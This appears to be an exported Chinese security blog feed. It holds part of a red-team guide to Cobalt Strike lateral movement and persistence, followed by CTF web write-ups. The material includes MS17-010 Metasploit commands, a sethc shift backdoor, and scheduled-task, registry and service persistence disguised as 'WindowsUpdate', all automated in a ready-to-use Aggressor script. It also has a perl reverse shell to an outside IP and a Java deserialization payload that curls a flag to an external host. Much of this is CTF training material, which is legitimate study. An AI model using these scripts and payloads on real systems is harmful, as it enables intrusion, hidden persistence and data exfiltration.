<p>额外的提权插件：<a href="https://github.com/rsmudge/ElevateKit">ElevateKit</a>额外增加 <code>ms14-058</code>、<code>ms15-051</code>、<code>ms16-016</code>、<code>uac-schtasks</code> 四种提权方式</p>
</blockquote>
<h4 id="fscan内网扫描"><a href="#fscan内网扫描" class="headerlink" title="fscan内网扫描"></a>fscan内网扫描</h4><p>上传 <a href="https://github.com/shadow1ng/fscan/releases/tag/1.6.0">fscan</a>工具进行内网扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24</span><br></pre></td></tr></table></figure>

<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>要想让本地主机连接内网中的主机，我们必须将web服务器作为跳板，这是我们可以让web服务器派生一个<code>Beacon SMB</code></p>
<blockquote>
<p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。</p>
</blockquote>
<p><code>Beacon SMB</code>具有两种方式</p>
<p><strong>第一种直接派生一个孩子，目的为了进一步盗取内网主机的 hash</strong></p>
<p>新建一个 <code>Listener</code>，<code>payload</code> 选择 <code>Beacon SMB</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715460b92fb0eb3e0366afbd8.png" alt="image-20201215152442544"></p>
<p>在已有的Beacon中点击<code>Spawn</code>派生一个新的Beacon</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171540feca1ae092d91c6db23a.png" alt="image-20201215152509529"></p>
<p>选择我们新建的Beacon SMB</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715466f61f7494e68635ba8e5.png" alt="image-20201215152609142"></p>
<p>这个时候我们就会派生出一个新的Beacon SMB</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715407b64e1f87325af4417af.png" alt="image-20201215152801722"></p>
<p>然后我们可以通过<code>link</code>和<code>unlink</code>的命令去连接主机</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154010013ebc045c68b5f336.png" alt="image-20201215153850351"></p>
<p><strong>第二种在已有的 beacon 上创建监听，用来作为跳板进行内网穿透</strong></p>
<p>前提是能够通过 shell 之类访问到内网其他主机</p>
<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p>在之前的探测中我们已经拿到了其他主机的凭证信息，这时候我们可以尝试使用<code>psexec</code>模块登录其他主机</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171540ef2f507b9b5dbe10b8ec.png" alt="image-20201215154123671"></p>
<p>使用Administrator的凭证进行登录，监听器和会话都选择刚刚的Beacon SMB</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715414cb1d4ed31ee42a0b30b.png" alt="image-20201215154615404"></p>
<p>可以看到我们已经成功连接到了ROOT-TVI862UBEH</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715413373116e07c2feff747b.png" alt="image-20201215154457704"></p>
<p>相同操作我们可以拿到OWA域控的主机</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171546864a2231241312976bd4.png" alt="image-20201215155327729"></p>
<h4 id="token"><a href="#token" class="headerlink" title="token"></a>token</h4><p>除了直接使用获取到的 <code>hash</code> 值，也可以直接窃取 <code>GOD\Administrator</code> 的 <code>Token</code> 来登录其他主机</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154147ed2affb6e1b27e76c6.png" alt="image-20201215155638725"></p>
<p>在psexec的时候勾选使用目前的access token</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171541bfca180a49bde7c28920.png" alt="image-20201215155751889"></p>
<p>get it！</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171541e6af90a3ce07d3b249a5.png" alt="image-20201215155933714"></p>
<h4 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h4><blockquote>
<p>在CS里使用ladon&#x2F;ladon_ms17010插件也可以，但是有时候不太稳定，所以这里主要讲如何联动MSF打MS17-010</p>
</blockquote>
<p>可以选择派生一个beacon到msf，这个上面介绍到了</p>
<p>也可以开一个socks4代理</p>
<p>CS里</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socks &lt;port&gt;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051013367602817e4ffb459dec55.png" alt="image-20210510004625495" style="zoom:80%;" />

<p>MSF里</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue // 只要存在漏洞就可以打，但是有概率蓝屏</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue_win8 // 只要存在漏洞就可以打，但是有概率蓝屏</span><br><span class="line">use exploit/windows/smb/ms17_010_psexec // 需要目标开启命名管道，并且比较稳定</span><br><span class="line">use auxiliary/admin/smb/ms17_010_command // 需要目标开启命名管道，并且比较稳定</span><br><span class="line"></span><br><span class="line">setg Proxies socks4:&lt;your host&gt;:&lt;port&gt;</span><br><span class="line">setg ReverseAllowProxy true</span><br><span class="line">set rhost &lt;victim host&gt;</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost &lt;your host&gt;</span><br><span class="line">set lport &lt;your port&gt;</span><br></pre></td></tr></table></figure>



<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><h4 id="添加隐藏属性"><a href="#添加隐藏属性" class="headerlink" title="添加隐藏属性"></a>添加隐藏属性</h4><p><code>+s</code>是设置系统属性，<code>+h</code>设置隐藏属性，如果需要取消将<code>+</code>换成<code>-</code>即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">attrib C:\test.exe +s +h</span><br></pre></td></tr></table></figure>

<h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p><code>/create</code>是创建新任务，<code>/TN</code>是<code>TaskName</code>的简写，也就是新建的任务的名字，在系统必须唯一，<code>/TR</code>是<code>TaskRun</code>的简写，即为需要运行的程序的路径和文件名。<code>/SC</code>是<code>schedule</code>的简写，指定执行的频率的时间单位， <code>/MO</code>是<code>modifier</code>的缩写，可以理解为执行的频率的时间数值。如果任务已经在执行<code>schtasks</code>并不会重复拉起任务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /create /tn WindowsUpdate /tr &quot;C:\test.txt&quot; /sc minute /mo 1</span><br></pre></td></tr></table></figure>

<p>删除：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /delete /tn WindowsUpdate</span><br></pre></td></tr></table></figure>

<h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><p>windows系统的开机项位于注册表的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>

<p>新建一个字符串值并修改数值数据为程序路径即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d &quot;C:\test.exe&quot; /f</span><br></pre></td></tr></table></figure>

<h4 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h4><p>需要system权限才能实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将所有文件改为仅管理员组(administrators)完全控制</span><br><span class="line">takeown /f c:\windows\system32\*.*   /a /r /d y</span><br><span class="line">cacls  c:\windows\system32\*.*  /T /E /G administrators:F</span><br><span class="line"># 如果提取后是system则使用以下命令</span><br><span class="line">cacls  c:\windows\system32\*.*  /T /E /G system:F</span><br><span class="line"># 覆盖shift命令</span><br><span class="line">copy C:\WINDOWS\system32\cmd.exe​ C:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>

<h4 id="Windows服务"><a href="#Windows服务" class="headerlink" title="Windows服务"></a>Windows服务</h4><p>在windows上系统服务可用SC命令进行增删改。</p>
<p>需要注意参数值与等号之间要有空格。使用Windows服务进行自启有个很有意思的地方，默认是以<code>system</code>权限启动，也是“提权”的一种不错的方式。另外有个小坑，<code>sc</code>在<code>powershell</code>中传参有问题，执行不成功，必须在<code>cmd</code>里执行。笔者刚开始写插件是全程用<code>bpowershell</code>函数执行命令，在这儿卡了有一会儿，相当难受。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc create &quot;WindowsUpdate&quot; binpath= &quot;cmd /c start C:\test.exe&quot;;</span><br><span class="line">sc config &quot;WindowsUpdate&quot; start= auto</span><br><span class="line">net start WindowsUpdate</span><br></pre></td></tr></table></figure>

<h4 id="自启目录"><a href="#自启目录" class="headerlink" title="自启目录"></a>自启目录</h4><p>本质上来说和注册表修改是同一个，一个是复制文件，一个是修改注册表。另外，如果用户不是<code>Administrator</code>，目录得改。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy &quot;C:\test.exe&quot; &quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe&quot; /y</span><br><span class="line">attrib &quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe&quot; +s +h</span><br></pre></td></tr></table></figure>

<h4 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h4><p>先设置好远控所在的目录，然后执行懒人攻略，重启正常情况下即可弹回四个会话。（一个<code>system</code>，三个<code>admin</code>）</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrivilegeHelper.cna</span></span><br><span class="line">popup beacon_bottom <span class="punctuation">&#123;</span></span><br><span class="line">	menu <span class="string">&quot;权限维持&quot;</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">		item <span class="string">&quot;设置路径&quot;</span> <span class="punctuation">&#123;</span></span><br><span class="line">			local(&#x27;$bid&#x27;);</span><br><span class="line">			foreach $bid ($<span class="number">1</span>)<span class="punctuation">&#123;</span></span><br><span class="line">				prompt_text(<span class="string">&quot;filePath&quot;</span><span class="punctuation">,</span> $filePath<span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					$filePath = $<span class="number">1</span>;</span><br><span class="line">					return $filePath;</span><br><span class="line">				<span class="punctuation">&#125;</span>);</span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		item <span class="string">&quot;隐藏文件&quot;</span> <span class="punctuation">&#123;</span></span><br><span class="line">			local(&#x27;$bid&#x27;);</span><br><span class="line">			foreach $bid ($<span class="number">1</span>)<span class="punctuation">&#123;</span></span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;attrib \&quot;$filePath\&quot; +s +h&quot;</span>);</span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		item <span class="string">&quot;定时任务&quot;</span> <span class="punctuation">&#123;</span></span><br><span class="line">			local(&#x27;$bid&#x27;);</span><br><span class="line">			foreach $bid ($<span class="number">1</span>)<span class="punctuation">&#123;</span></span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;schtasks /create /tn WindowsUpdate /tr \&quot;$filePath\&quot; /sc minute /mo 1&quot;</span>);</span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">		item <span class="string">&quot;注册表&quot;</span><span class="punctuation">&#123;</span></span><br><span class="line">			local(&#x27;$bid&#x27;);</span><br><span class="line">			foreach $bid ($<span class="number">1</span>)<span class="punctuation">&#123;</span></span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \&quot;$filePath\&quot; /f&quot;</span>);</span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">		item <span class="string">&quot;SC服务&quot;</span><span class="punctuation">&#123;</span></span><br><span class="line">			local(&#x27;$bid&#x27;);</span><br><span class="line">			foreach $bid ($<span class="number">1</span>)<span class="punctuation">&#123;</span></span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;sc create \&quot;WindowsUpdate\&quot; binpath= \&quot;cmd /c start \&quot;$filePath\&quot;\&quot;&amp;&amp;sc config \&quot;WindowsUpdate\&quot; start= auto&amp;&amp;net start WindowsUpdate&quot;</span>);</span><br><span class="line"></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">		item <span class="string">&quot;shift启动&quot;</span><span class="punctuation">&#123;</span></span><br><span class="line">			local(&#x27;$bid&#x27;);</span><br><span class="line">			foreach $bid ($<span class="number">1</span>)<span class="punctuation">&#123;</span></span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;takeown /f C:\\windows\\system32\\sethc.* /a /r /d y&amp;&amp;cacls C:\\windows\\system32\\sethc.exe /T /E /G system:F&amp;&amp;copy \&quot;$filePath\&quot; C:\\windows\\system32\\sethc.exe /y&quot;</span>);</span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">		item <span class="string">&quot;自启动目录&quot;</span><span class="punctuation">&#123;</span></span><br><span class="line">			local(&#x27;$bid&#x27;);</span><br><span class="line">			foreach $bid ($<span class="number">1</span>)<span class="punctuation">&#123;</span></span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;copy \&quot;$filePath\&quot; \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; /y&quot;</span>);</span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;attrib \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; +s +h&quot;</span>);</span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">		item <span class="string">&quot;懒人攻略&quot;</span> <span class="punctuation">&#123;</span></span><br><span class="line">			local(&#x27;$bid&#x27;);</span><br><span class="line">			foreach $bid ($<span class="number">1</span>)<span class="punctuation">&#123;</span></span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;attrib \&quot;$filePath\&quot; +s +h&quot;</span>);</span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;schtasks /create /tn WindowsUpdate /tr \&quot;$filePath\&quot; /sc minute /mo 1&quot;</span>);</span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \&quot;$filePath\&quot; /f&quot;</span>);</span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;sc create \&quot;WindowsUpdate\&quot; binpath= \&quot;cmd /c start \&quot;$filePath\&quot;\&quot;&amp;&amp;sc config \&quot;WindowsUpdate\&quot; start= auto&amp;&amp;net start WindowsUpdate&quot;</span>);</span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;takeown /f C:\\windows\\system32\\sethc.* /a /r /d y&amp;&amp;cacls C:\\windows\\system32\\sethc.exe /T /E /G system:F&amp;&amp;copy \&quot;$filePath\&quot; C:\\windows\\system32\\sethc.exe /y&quot;</span>);</span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;copy \&quot;$filePath\&quot; \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; /y&quot;</span>);</span><br><span class="line">				bshell($<span class="number">1</span><span class="punctuation">,</span> <span class="string">&quot;attrib \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; +s +h&quot;</span>);</span><br><span class="line"></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="findstr"><a href="#findstr" class="headerlink" title="findstr"></a>findstr</h3><p>帮助命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /?</span><br></pre></td></tr></table></figure>

<p>查找含某个字符串的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /NI /C:&quot;hello world&quot; demo.txt</span><br></pre></td></tr></table></figure>

<p>查找含某个字符串的文件名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /MSI &quot;netingcn.com&quot; *.txt</span><br></pre></td></tr></table></figure>

<p>常用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /s /i /m /c:&quot;password&quot; *.txt</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://v0w.top/2020/07/19/vulnstack1">红日安全vulnstack-ATT&amp;CK实战系列 红队实战（一）</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjMwNDYxNw==&mid=2247483876&idx=1&sn=1c716ca9937a6af819229070247cae7a">域渗透笔记-信息收集（一）</a></p>
<p><a href="https://xz.aliyun.com/t/5881">初探CobaltStrike权限维持及其自动化</a></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 V&amp;N CTF Web</title>
    <url>/2020/03/01/%C2%96%C2%962020-V-N-CTF-Web/</url>
    <content><![CDATA[<p>有很多地方没有转过来，思维过于僵硬，感谢赵师傅出的精美题目</p>
<span id="more"></span>

<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>CTFd 的漏洞</p>
<p>简单来说来说就是注册带空格恶意用户名然后忘记密码进行修改</p>
<p><a href="https://www.colabug.com/2020/0204/6940556/">https://www.colabug.com/2020/0204/6940556/</a></p>
<h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>找了亿个反弹 shell，下面是有用的一个</p>
<blockquote>
<p><a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p>
<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;174.0.216.98:9000&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>

<p>系统没有 losf、ps 等进程命令，所以自己逐个去 &#x2F;proc 找</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app@362cb9dcadd1:/proc$ cd 10</span><br><span class="line">app@362cb9dcadd1:/proc/10$ cd fd</span><br><span class="line">app@362cb9dcadd1:/proc/10/fd$ ls -al</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 app app  0 Feb 29 05:47 .</span><br><span class="line">dr-xr-xr-x 9 app app  0 Feb 29 05:43 ..</span><br><span class="line">lrwx------ 1 app app 64 Feb 29 05:47 0 -&gt; /dev/null</span><br><span class="line">l-wx------ 1 app app 64 Feb 29 05:47 1 -&gt; &#x27;pipe:[421276576]&#x27;</span><br><span class="line">l-wx------ 1 app app 64 Feb 29 05:47 2 -&gt; &#x27;pipe:[421276577]&#x27;</span><br><span class="line">lr-x------ 1 app app 64 Feb 29 05:47 3 -&gt; &#x27;/home/app/flag.txt (deleted)&#x27;</span><br><span class="line">lrwx------ 1 app app 64 Feb 29 05:47 4 -&gt; &#x27;socket:[421292108]&#x27;</span><br><span class="line">app@362cb9dcadd1:/proc/10/fd$ cat 3</span><br><span class="line">flag&#123;85693908-b5aa-4f03-96a8-133fc30854d3&#125;</span><br></pre></td></tr></table></figure>



<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>phpinfo 没有读到有用的信息</p>
<p>读 composer.json 文件根据组件查找 CVE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;require&quot;:&#123;</span><br><span class="line">		&quot;guzzlehttp/guzzle&quot;:&quot;6.2.0&quot;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.laruence.com/2016/07/19/3101.html">https://www.laruence.com/2016/07/19/3101.html</a></p>
<p>开一台内网主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># index.php</span><br><span class="line">&lt;?php</span><br><span class="line">        $arr = array(&quot;success&quot;=&gt;true);</span><br><span class="line">        header(&quot;Content-Type:application/json&quot;);</span><br><span class="line">        echo json_encode($arr);</span><br><span class="line"># 执行 php -S 0:9999</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Proxy: http://174.0.216.98:9999</span><br></pre></td></tr></table></figure>



<h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>javaweb 的题目</p>
<p>这里用 Tools 类生成 cookies，而 Tools 类继承序列化类，所以 cookies 有反序列化操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// springmvcdemo.war!\WEB-INF\classes\com\filters\ClentInfoFilter.class</span></span><br><span class="line"><span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line">      Base64.<span class="type">Decoder</span> <span class="variable">decoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">      <span class="type">byte</span>[] bytes = decoder.decode(b64);</span><br><span class="line">      <span class="type">ClientInfo</span> <span class="variable">cinfo</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">if</span> ((b64.equals(<span class="string">&quot;&quot;</span>)) || (bytes == <span class="literal">null</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        cinfo = <span class="keyword">new</span> <span class="title class_">ClientInfo</span>(<span class="string">&quot;Anonymous&quot;</span>, <span class="string">&quot;normal&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId());</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">          bytes = Tools.create(cinfo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        cookie.setValue(encoder.encodeToString(bytes));</span><br></pre></td></tr></table></figure>

<p>PictureController.class 存在文件上传和文件包含，需要伪造成 admin，webmanager，我们直接在任意一个 jsp 页面运行以下代码覆盖原 cookies 就可以拿去文件上传了。</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">ClientInfo</span> <span class="variable">cinfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClientInfo</span>(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;webmanager&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId());</span><br><span class="line">    <span class="type">byte</span>[] bytes = Tools.create(cinfo);</span><br><span class="line">    cookie = <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;cinfo&quot;</span>, encoder.encodeToString(bytes));</span><br><span class="line">    cookie.setMaxAge(<span class="number">86400</span>);</span><br><span class="line">    ((HttpServletResponse)response).addCookie(cookie);</span><br><span class="line">    ((HttpServletRequest)request).getSession().setAttribute(<span class="string">&quot;cinfo&quot;</span>, cinfo);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>但是文件上传只能通过修改文件名存储到 &#x2F;tmp 目录，jsp 文件包含除了 jpg 和 gif 只能取到文件名，所以此处文件包含是不可取了。赛后看了其他大哥的博客，原来是 <code>ProcessBuilder</code>漏洞。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// springmvcdemo.war!\WEB-INF\classes\com\tools\Tools.class</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span></span><br><span class="line">  <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> in.readObject();</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>((String[])obj).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以通过重写<code>writeObject</code>方法来实现，来构造一个字符串传给<code>ProcessBuilder</code>执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;curl http://174.0.218.99:9000/`/readflag`&quot;</span>&#125;;</span><br><span class="line">        out.writeObject(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 Tools 类里加上上面的函数，然后生成序列化的 cookies，带上去另一边监听即可得到 flag</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.tools.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Tools</span> <span class="variable">cinfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tools</span>();</span><br><span class="line">            <span class="type">byte</span>[] bytes = Tools.create(cinfo);</span><br><span class="line">            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> encoder.encodeToString(bytes);</span><br><span class="line">            System.out.println(payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-2</title>
    <url>/2020/05/26/BUUCTF-2/</url>
    <content><![CDATA[<p> 补一下最近的 BUUCTF 做题记录</p>
<span id="more"></span>

<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><strong>Node.js</strong></p>
<p>利用报错可以得知前端 php ，后端是 vm2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">var err = new Error();</span><br><span class="line">return err.stack;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>去 github 搜索 vm2 的漏洞找到以下的 payload</p>
<p><a href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p>
